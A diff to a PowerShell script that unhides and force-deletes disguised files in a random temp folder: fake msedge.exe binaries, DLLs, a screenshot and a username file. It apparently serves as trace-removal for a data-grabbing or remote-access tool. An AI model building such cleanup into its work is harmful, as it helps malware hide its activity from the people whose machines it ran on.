@@ -1,4 +1,15 @@
 Start-Sleep 10
+
+$filePath = "$env:temp/sVBXKuz/msedge.exe"
+$dll1Path = "$env:temp/sVBXKuz/libsodium.dll"
+$dll2Path = "$env:temp/sVBXKuz/libopus.dll"
+$folderPath = "$env:temp/sVBXKuz/"
+
+Set-ItemProperty -Path $filePath -Name Attributes -Value ([IO.FileAttributes]::Normal)
+Set-ItemProperty -Path $dll1Path -Name Attributes -Value ([IO.FileAttributes]::Normal)
+Set-ItemProperty -Path $dll2Path -Name Attributes -Value ([IO.FileAttributes]::Normal)
+Set-ItemProperty -Path $folderPath -Name Attributes -Value ([IO.FileAttributes]::Normal)
+
 Remove-Item $env:temp\sVBXKuz\wsappa.exe -Force
 Remove-Item $env:temp\sVBXKuz\msedge.exe -Force
 Remove-Item $env:temp\sVBXKuz\microsoft_edge.exe -Force
@@ -6,9 +17,8 @@ Remove-Item $env:temp\sVBXKuz\libsodium.dll -Force
 Remove-Item $env:temp\sVBXKuz\libopus.dll -Force
 Remove-Item $env:temp\sVBXKuz\screenshot.png -Force
 
-$folderPath = "$env:temp/sVBXKuz/"
-Set-ItemProperty -Path $folderPath -Name Attributes -Value ([IO.FileAttributes]::Normal)
 cd..
+
 Remove-Item $env:temp\sVBXKuz -Recurse -Force
 Remove-Item $env:temp\username.json
 
